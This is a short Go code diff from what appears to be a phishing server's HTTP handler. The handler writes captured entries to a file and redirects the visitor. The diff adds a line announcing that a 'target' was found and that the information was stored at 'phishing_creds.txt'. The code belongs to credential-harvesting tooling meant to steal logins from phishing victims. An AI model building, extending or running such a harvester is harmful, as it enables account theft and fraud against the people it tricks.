@@ -107,6 +107,7 @@ Captured:
 				defer f.Close()
 				io.WriteString(f, logEntry)
 			}
+			fmt.Printf("found target %s, information captured and stored at phishing_creds.txt", email)
 		}
 		http.Redirect(w, r, "/", http.StatusSeeOther)
 	})
